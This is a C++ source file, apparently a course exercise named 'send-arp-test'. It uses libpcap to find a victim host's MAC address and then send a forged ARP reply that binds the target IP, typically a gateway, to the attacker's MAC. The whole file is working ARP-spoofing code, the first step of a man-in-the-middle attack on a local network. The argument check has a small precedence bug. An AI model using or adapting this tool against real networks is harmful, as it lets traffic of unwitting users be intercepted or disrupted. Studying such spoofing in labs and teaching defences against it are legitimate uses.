#include <cstdio>
#include <pcap.h>
#include <iostream>
#include "mac.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "mylibnet.h"
#include <unistd.h>
#include <vector>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> sender target\n");
    printf("sample: send-arp-test wlan0 192.168.123.123 192.168.123.1\n");
}

void sendARP(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderMAC, u_int8_t* myMAC){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(senderMAC);   // sender
    packet.eth_.smac_ = myMAC;   // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMAC;   //me
    packet.arp_.sip_ = htonl(target); // target
    packet.arp_.tmac_ = Mac(senderMAC);   // sender
    packet.arp_.tip_ = htonl(sender);    // senderIP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void sendRequest(pcap_t* handle, Ip sender, Ip target, u_int8_t* myMAC){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");   // sender
    packet.eth_.smac_ = myMAC;   // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMAC;   //me
    packet.arp_.sip_ = htonl(target); // target
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");   // sender
    packet.arp_.tip_ = htonl(sender);    // senderIP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}


void getSenderMAC(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderEther, u_int8_t* myMAC){
    while (true) {
        sendRequest(handle, sender, target, myMAC);
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        ether_header ether = getEther(packet);
        ip_header ip = getIp(packet);

        if(!(ether.type[0] == 0x08 && ether.type[1] == 0x06)) continue;
        if(changeIp(ip.sender) != sender) continue;
        for(int i = 0; i < 6; i++) senderEther[i] = ether.src[i];
        return;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || !argc%2) {
        usage();
        return -1;
    }

    char* dev = argv[1];

    vector<Ip> senderList;
    vector<Ip> targetList;

    for(int i = 2; i < argc; i+=2){
        senderList.push_back(Ip(argv[i]));
        targetList.push_back(Ip(argv[i+1]));
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    for(int i = 0; i < (argc-1)/2; i++){
        printf("...");
        u_int8_t myMAC[6];
        getMAC(dev, myMAC);
        u_int8_t senderMAC[6]; getSenderMAC(handle, senderList[i], targetList[i], senderMAC, myMAC);
        sendARP(handle, senderList[i], targetList[i], senderMAC, myMAC);
        printf(" done %d!\n", i+1);
    }

    printf("Finished send ARP packet!\n");

    pcap_close(handle);
}
